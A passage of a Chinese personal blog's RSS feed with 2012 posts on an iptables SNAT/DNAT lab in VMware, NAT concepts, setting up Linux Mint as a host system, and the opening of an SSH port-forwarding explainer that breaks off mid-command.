&lt;p&gt;&lt;img alt=" 拓扑图 " src="http://www.goorockey.com/uploads/2012/03/image_thumb.png"/&gt;&lt;/p&gt;
&lt;p&gt; 如图分别有 4 台机子：A、B 在内网，但在不同的网段中，C 做网关，控制网段间的访问。D 在外网。&lt;/p&gt;
&lt;p&gt; 要达到：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A、B 能通信（内网不同网段的互访）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A、B 能通过 C 与外网通信 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;D 能通过 C 访问到 A、B 的服务 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="_2"&gt; 环境 &lt;/h2&gt;
&lt;p&gt; 用 VMWare 虚拟出这 4 台机子，VMWare 的版本为 8.0&lt;/p&gt;
&lt;p&gt; 每台机子都跑 CentOS 6.0&lt;/p&gt;
&lt;h2 id="vmware"&gt;VMWare 环境配置 &lt;/h2&gt;
&lt;p&gt; 安装 4 个虚拟机，都装上 CentOS，主机名分别定为 hostA、hostB、hostC、hostD，对应 A、B、C、D。&lt;/p&gt;
&lt;p&gt;VMWare 新建几张网卡（菜单栏【edit】-【Virtual Network Editor】），要求一张为 Bridged（NAT 应该也行），两张为 Host-only。&lt;/p&gt;
&lt;p&gt;&lt;img alt="VMWare 网卡设置 " src="http://www.goorockey.com/uploads/2012/03/151306312_thumb.png"/&gt;&lt;/p&gt;
&lt;p&gt; 设置 A、B 网卡分别为 VMnet1 和 VMnet2，这是为了使它们原始都不能互访。&lt;/p&gt;
&lt;p&gt; 外网的 D 网卡设为 VMnet0&lt;/p&gt;
&lt;p&gt;C 则有三张网卡 VMnet0、VMnet1、VMnet2，这样 C 原始都能访问到 A、B、D。&lt;/p&gt;
&lt;p&gt; 然后进入每个虚拟机，为了方便，我都设置为静态 ip（网段跟上图对应）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="err"&gt;：&lt;/span&gt;&lt;span class="mf"&gt;192.168.149.128&lt;/span&gt;
&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="err"&gt;：&lt;/span&gt;&lt;span class="mf"&gt;192.168.214.128&lt;/span&gt;
&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;：&lt;/span&gt;&lt;span class="mf"&gt;192.168.4.233&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="n"&gt;eth0&lt;/span&gt;&lt;span class="err"&gt;），&lt;/span&gt;&lt;span class="mf"&gt;192.168.149.130&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="n"&gt;eth1&lt;/span&gt;&lt;span class="err"&gt;），&lt;/span&gt;&lt;span class="mf"&gt;192.168.214.130&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="n"&gt;eth2&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;
&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="err"&gt;：&lt;/span&gt;&lt;span class="mf"&gt;192.168.4.234&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;CentOS 里面配置网卡方法就是修改 /etc/sysconfig/network-scripts/ifcfg-eth*，没有则自己创建一个。&lt;/p&gt;
&lt;p&gt; 关键项就是 ONBOOT，IPADDR，NETMASK，GATEWAY，DNS1，DNS2，PEERDNS&lt;/p&gt;
&lt;p&gt; 要注意的是，有 PEERDNS 项，当它值为 yes，则会把 DNS1 和 DNS2 覆盖地写入 /etc/resolv.conf。&lt;/p&gt;
&lt;p&gt; 这对于多网卡的 C，如果 ifcfg-eth0、ifcfg-eth1、ifcfg-eth2 都设了 PEERDNS，由于开机是按名字的顺序执行，则会把 ifcfg-eth2 的 DNS 写入 /etc/resolv.conf，前两个文件的 DNS 会无效了的。所以我只在 ifcfg-eth0 配置 PEERDNS=“yes“。&lt;/p&gt;
&lt;p&gt; 好，初步网络环境配置完成。&lt;/p&gt;
&lt;p&gt; 现在情况是：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ABD&lt;/span&gt;&lt;span class="err"&gt; 都不能互访，因为在不同的网段 &lt;/span&gt;
&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt; 则都能跟它们三个互访 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id="ciptablesnat"&gt; 配置网关 C 的 iptables，实现 NAT&lt;/h2&gt;
&lt;p&gt; 到关键也是好玩的地方了。&lt;/p&gt;
&lt;p&gt; 接下来配置网关 C 的 iptables，实现不同网络间地址的转换（NAT）。&lt;/p&gt;
&lt;p&gt;iptables 内容比较多，详细可以参考：&lt;a href="http://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html"&gt;http://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1.A、B 通过 C 实现通信 &lt;/p&gt;
&lt;p&gt; 这个比较简单，没用到 iptables，把 A 的网关设为 C 的对应网卡的 ip（192.168.149.130），B 的网关设为 C 对应网卡的 ip（192.168.214.130）。&lt;/p&gt;
&lt;p&gt; 然后打开 C 的 ip 转发，在 C 中执行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;echo&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;proc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ipv4&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ip_forward&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 这就把 C 作为了 A、B 的网关。A、B 间通信的数据包会发到 C，靠 C 的网卡间转发来完成通信。AB 就可以相互 ping 通了。&lt;/p&gt;
&lt;p&gt;2.A、B 通过 C 与外网通信（SNAT）&lt;/p&gt;
&lt;p&gt; 现在 A、B 都不能跟 D 通信，因为现在 A、B 发到 D 的数据包源地址（192.168.149.128,192.168.214.128），D 是无法知道的（D 在 C 的同一个网络，网关设为相同的 ip）。则包可以发到 D，但 D 回复不了，因为它的网关不知道 A、B。&lt;/p&gt;
&lt;p&gt; 现在就通过 SNAT 把 A、B 发送的包在经过 C 时，把源地址改为 C 的外网 ip（192.168.4.233），这个 D 是知道的，也就可以顺利回复了。&lt;/p&gt;
&lt;p&gt; 具体在 C 中执行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;iptables&lt;/span&gt;&lt;span class="err"&gt; –&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;nat&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="n"&gt;POSTROUTING&lt;/span&gt;&lt;span class="err"&gt; –&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;eth0&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="n"&gt;SNAT&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;source&lt;/span&gt; &lt;span class="mf"&gt;192.168.4.233&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 这样 A、B 就能 ping 通了。&lt;/p&gt;
&lt;p&gt;SNAT 可以看看我的博文。 嘻嘻 ……&lt;/p&gt;
&lt;p&gt;3.D 通过 C 访问 A、B 的服务（DNAT）&lt;/p&gt;
&lt;p&gt; 现在 A、B 可以跟 D 通信，但 D 不能主动访问 A、B。还是因为 D 只知道 C，不知道 A、B。&lt;/p&gt;
&lt;p&gt; 假如现在 A 开了 19991 口的 sshd：&lt;/p&gt;
&lt;p&gt; 在 A 的 /etc/ssh/sshd_config 中添加：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ListenAddress&lt;/span&gt; &lt;span class="mf"&gt;0.0.0.0&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;19991&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 重启 sshd&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt; &lt;span class="n"&gt;sshd&lt;/span&gt; &lt;span class="n"&gt;restart&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 在 A 中让 iptables 允许对 19991 口的访问 &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;iptables&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt; &lt;span class="n"&gt;INPUT&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dport&lt;/span&gt; &lt;span class="mi"&gt;19991&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="n"&gt;ACCEPT&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 现在 D 想 ssh 到 A 的 19991，则可以在 C 中执行以下命令，实现 DNAT：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;iptables&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;nat&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="n"&gt;PREROUTING&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="mi"&gt;19991&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="n"&gt;DNAT&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;destination&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.168.149.128&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 现在 D 可以通过 ssh 到 C 的 19991 口来 ssh 到 A 了。&lt;/p&gt;
&lt;h2 id="_3"&gt; 小结 &lt;/h2&gt;
&lt;p&gt; 整个实验搞完，对 iptables，NAT 的原理还是深刻了不少。&lt;/p&gt;
&lt;p&gt; 然后，就是 VMWare 是个好东西。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Tue, 13 Mar 2012 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-03-13:blog/2012/03/13/vmwarezu-wang-shi-yan-nat/</guid><category>network</category><category>vmware</category><category>nat</category></item><item><title>NAT学习总结</title><link>http://www.goorockey.com/blog/2012/03/11/natxue-xi-zong-jie/</link><description>
&lt;p&gt; 最近要恶补一下计算机网络的基础知识，今天先总结一下 NAT。&lt;/p&gt;
&lt;h2 id="nat"&gt;NAT 的背景 &lt;/h2&gt;
&lt;p&gt; 随着 Internet 的普及，网络中的 ip 资源是越来越紧张。而 NAT 就是为了解决这个问题的方案。&lt;/p&gt;
&lt;p&gt;NAT 是 Network Address Translation, 网络地址转换，会在网关中实现局域网内部 ip 和外网 ip 之间转换。&lt;/p&gt;
&lt;p&gt;&lt;img alt="NAT" src="http://www.goorockey.com/uploads/2012/03/nat.png"/&gt;&lt;/p&gt;
&lt;p&gt; 如上图，局域网内部网段是 192.168.1.X，这些 ip 只在这个局域网内有意义，外网无法根据这些 ip 定位计算机。&lt;/p&gt;
&lt;p&gt; 而 NAT 就是做内网和外网这样两个网络间的 ip 转换。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id="nat_1"&gt;NAT 的类型 &lt;/h2&gt;
&lt;p&gt; 按照通信发起方的不同，NAT 可以分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;SNAT，即 Source NAT&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNAT，即 Destination NAT&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;1.SNAT&lt;/p&gt;
&lt;p&gt;SNAT 是对数据包源 ip 的转换，主要用于内网机子发起连接到外网的情况。&lt;/p&gt;
&lt;p&gt;【考虑以下场景】：&lt;/p&gt;
&lt;p&gt; 内网 ip 为 192.168.1.2 的机子向外网的 8.8.8.8 发包。如果数据包的源 ip 直接就是 192.168.1.2，数据包虽然可以成功到达 8.8.8.8，但是它无法根据 192.168.1.2 的源 ip 回复数据包，因为在外网中没有 192.168.1.2，则造成通信失败。&lt;/p&gt;
&lt;p&gt; 而 SNAT 就是当内网发起连接到外网时，具有 NAT 功能的机子，例如网关，在数据包要出外网之前，把包的源 ip 改为这个局域网的外网 ip，如 1.1.1.1，同时会有映射表记录转换。&lt;/p&gt;
&lt;p&gt; 由于 1.1.1.1 是外网中有意义的 ip，1.1.1.1 和 8.8.8.8 可以成功的完成数据包的发送和接受。这时 8.8.8.8 是把 1.1.1.1 作为目标 ip 回复数据包，网关收到数据包后，会查表把包的目标 ip 映射回内网机子 ip 192.168.1.2。&lt;/p&gt;
&lt;p&gt; 可以看出来，整个过程对内网机子是透明的，即发送和接受数据包的 ip 都对应，仿佛没有做过转换。&lt;/p&gt;
&lt;p&gt;2.DNAT&lt;/p&gt;
&lt;p&gt;DNAT 是对数据包目标 ip 的转换，主要用于外网向内网发起连接的情况。&lt;/p&gt;
&lt;p&gt;【考虑一下场景】：&lt;/p&gt;
&lt;p&gt; 在内网中有很多机子，其中有一台 ip 为 192.168.1.2 的机子是对外网提供服务的 web 服务器，现在外网的 8.8.8.8 要访问它。但对于 8.8.8.8 来说，web 服务器所在 ip 会是 192.168.1.2 所在内网的外网 ip，如 1.1.1.1。&lt;/p&gt;
&lt;p&gt; 可想而知，当 8.8.8.8 向 1.1.1.1 发送数据包，网关会做 DNAT，把包的目标 ip 从 1.1.1.1 改为 192.168.1.2，同时会把转换记录到一个表中。然后 192.168.1.2 回复数据包，包的源 ip 是 192.168.1.2，目标 ip 会是 8.8.8.8。网关接受到包后，则查表，把源 ip 修改回 1.1.1.1。&lt;/p&gt;
&lt;h2 id="nat_2"&gt;NAT 的转换方式 &lt;/h2&gt;
&lt;p&gt;NAT 有四种转换方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 静态 NAT  (Static NAT)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 动态 NAT  (Dynamic NAT)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 过载      (Overload NAT)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 重叠      (Overlap NAT)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;1.Static NAT&lt;/p&gt;
&lt;p&gt;&lt;img alt="Static NAT" src="http://www.goorockey.com/uploads/2012/03/nat-static.jpg"/&gt;&lt;/p&gt;
&lt;p&gt; 局域网有多个外网 ip，数量等于或多于内网 ip 数。&lt;/p&gt;
&lt;p&gt; 则做 NAT 转换时，每个内网 ip 对应一个外网 ip。&lt;/p&gt;
&lt;p&gt; 网关的表中记录着这样一对一的关系。&lt;/p&gt;
&lt;p&gt;2.Dynamic NAT&lt;/p&gt;
&lt;p&gt;&lt;img alt="Dynamic NAT" src="http://www.goorockey.com/uploads/2012/03/nat-dynamic.jpg"/&gt;&lt;/p&gt;
&lt;p&gt; 局域网有多个外网 ip，但数量少于内网 ip 数。&lt;/p&gt;
&lt;p&gt; 则做转换时，每个内网 ip 从当前未被映射的外网 ip 选取一个来做转换。&lt;/p&gt;
&lt;p&gt; 网关的表也会记录这种转换，且会根据情况不断更新。&lt;/p&gt;
&lt;p&gt;3.Overload NAT&lt;/p&gt;
&lt;p&gt;&lt;img alt="Overload NAT" src="http://www.goorockey.com/uploads/2012/03/nat-overload.jpg"/&gt;&lt;/p&gt;
&lt;p&gt; 如果局域网只有一个外网 ip，每个内网 ip 都映射到这个外网 ip，但端口口会不同。&lt;/p&gt;
&lt;p&gt; 网关的表中会记录这种端口的映射。&lt;/p&gt;
&lt;p&gt;4.Overlap NAT&lt;/p&gt;
&lt;p&gt;&lt;img alt="Overlap NAT" src="http://www.goorockey.com/uploads/2012/03/nat-overlap.jpg"/&gt;&lt;/p&gt;
&lt;p&gt; 当内网的 ip 在外网中已经注册且已被其他机子使用时，网关要在选择一个外网中已注册但未被使用的 ip 做转换。&lt;/p&gt;
&lt;p&gt; 网关的表中记录这种转化。&lt;/p&gt;
&lt;h2 id="_1"&gt; 小结 &lt;/h2&gt;
&lt;p&gt; 其实所谓的内网和外网都是相对而言，只要是两个网络间的通信，都可以或需要用网关或路由做 NAT。&lt;/p&gt;
&lt;p&gt;【参考资料】：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://article.yeeyan.org/view/185403/150856"&gt;http://article.yeeyan.org/view/185403/150856&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://zh.wikipedia.org/wiki/ 网络地址转换 "&gt;http://zh.wikipedia.org/wiki/ 网络地址转换 &lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Sun, 11 Mar 2012 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-03-11:blog/2012/03/11/natxue-xi-zong-jie/</guid><category>network</category><category>nat</category></item><item><title>再次用linux做宿主系统</title><link>http://www.goorockey.com/blog/2012/02/29/zai-ci-yong-linuxzuo-su-zhu-xi-tong/</link><description>
&lt;h2 id="_1"&gt; 背景 &lt;/h2&gt;
&lt;p&gt; 之前就试过几次想把 linux 作为宿主来玩，但都因为舍弃不了一些 windows 下的软件而放弃了，例如 wiz，qq 等都是我常用的软件。试过 wine，但总是有点错误，不完美。&lt;/p&gt;
&lt;p&gt; 最近也在微博上收集意见，发现用 linux 做宿主系统的人还是蛮多的。其实仔细想想，归根结底还是自己 linux 的操作还不熟练。&lt;/p&gt;
&lt;p&gt; 还好最近一段时间自己多了在 linux 的工作，这几天又下定决心一次装了 linux 做宿主来玩了。然后就想写个 blog 记录一下。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id="_2"&gt; 系统 &lt;/h2&gt;
&lt;p&gt; 这次选的 linux 的 linux mint(64bit)，一个基于 ubuntu 的 linux 发行版。&lt;/p&gt;
&lt;p&gt; 官方说其目标是成为有 windows 那样市场占有率的 linux 发行版。&lt;/p&gt;
&lt;p&gt; 我不大喜欢 ubuntu 现在的 natty，所以就在虚拟机试用了一下 linux mint，感觉比 ubuntu 方便。&lt;/p&gt;
&lt;h2 id="_3"&gt; 工具 &lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt; 浏览器 &lt;/strong&gt;：firefox。一直用 firefox，插件强大。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt; 知识管理 &lt;/strong&gt;：evernote。本地用 nevernote，它是 evernote 的 linux 版；网页摘取用 firefox 的 evernote clip。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;X windows&lt;/strong&gt;: awesome。一种平铺窗口管理器。本来想用 musca，但我没编译成功。唉 ~~&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;BT 下载 &lt;/strong&gt;：utorrent。utorrent 有 linux 版，但是 web gui 版。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt; 虚拟机 &lt;/strong&gt;：virtualbox。在 virtualbox 装了 xp，感觉比 vmware 快多了。。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="_4"&gt; 日常应用 &lt;/h2&gt;
&lt;p&gt;1. 网络管理 &lt;/p&gt;
&lt;p&gt;ubuntu( 包括 linux mint) 现在都是默认用 NetworkManager 来管理网络。我用了几次都不适应。这次立刻就把它卸载了，直接用脚本来管理网络。卸载命令：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;purge&lt;/span&gt; &lt;span class="n"&gt;remove&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;manager&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;purge&lt;/span&gt; &lt;span class="n"&gt;remove&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;manager&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;gnome&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 然后就直接对 /etc/network/interfaces 和 /etc/resolv.conf 做修改，来配置网络了。&lt;/p&gt;
&lt;p&gt;2.ADSL 连接 &lt;/p&gt;
&lt;p&gt; 寝室是用电信上网，如果不用路由拨号，就要自己电脑直接连到网口，自己拨号。&lt;/p&gt;
&lt;p&gt; 配置命令：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;pppoeconf&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 在弹出的窗口中输入帐号和密码，注意之后有个提示选择是否开机时就自动拨号，如果不时总是直接连网口的，就不选吧。&lt;/p&gt;
&lt;p&gt; 配置完回到命令行，输入拨号命令就可以上网了：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;pon&lt;/span&gt; &lt;span class="n"&gt;dsl&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;provider&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 断开链接的命令则是：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;pppoe&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;stop&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;3. 连 wifi&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.jiangmiao.org/blog/1781.html"&gt;http://www.jiangmiao.org/blog/1781.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4. 做 AP，共享 wifi&lt;/p&gt;
&lt;p&gt;&lt;a href="http://blog.csdn.net/feifei454498130/article/details/6642140"&gt;http://blog.csdn.net/feifei454498130/article/details/6642140&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;5. 截图 &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;scrot&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;bst&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 然后用鼠标框主目标即可。如果没有制定输出文件路径 file，默认输出到用户主目录，并以时间命名。&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;strong&gt;2012.7.12 更新 &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 找到一篇介绍自己只使用命令行经验的博文，好正点！&lt;/p&gt;
&lt;p&gt;&lt;a href="http://blog.chavezgu.com/2012/03/07/the-command-line-challenge/"&gt;http://blog.chavezgu.com/2012/03/07/the-command-line-challenge/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; 赞同里面循序渐进脱离 GUI 的方法；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 坚持一天只使用命令行！&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 坚持一周！！&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 坚持一个月！！！&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 坚持半年！！！！&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 呵呵～～&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Wed, 29 Feb 2012 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-02-29:blog/2012/02/29/zai-ci-yong-linuxzuo-su-zhu-xi-tong/</guid><category>linux</category></item><item><title>SSH端口转发</title><link>http://www.goorockey.com/blog/2012/02/22/sshduan-kou-zhuan-fa/</link><description>
&lt;h2 id="ssh"&gt;ssh 端口转发是什么 &lt;/h2&gt;
&lt;p&gt;ssh 端口转发也被叫 ssh 隧道，ssh 代理。&lt;/p&gt;
&lt;p&gt; 所谓隧道，就是用 X 协议封装 Y 协议的数据包，靠 X 协议来进行 Y 协议通信。&lt;/p&gt;
&lt;p&gt; 总的来说 ssh 隧道提供了两个好处：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 突破防火墙等，进行受限协议的通信。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 使如 telnet 等不安全的协议传输经过 ssh 的加密通道，提高安全性。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- more --&gt;
&lt;h2 id="ssh_1"&gt; 三种 ssh 端口转发 &lt;/h2&gt;
&lt;p&gt;ssh 端口转发有三种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 本地转发 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 远程转发 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 动态转发 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="_1"&gt; 本地转发 &lt;/h2&gt;
&lt;p&gt; 命令是：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;remote&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;remote&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt; 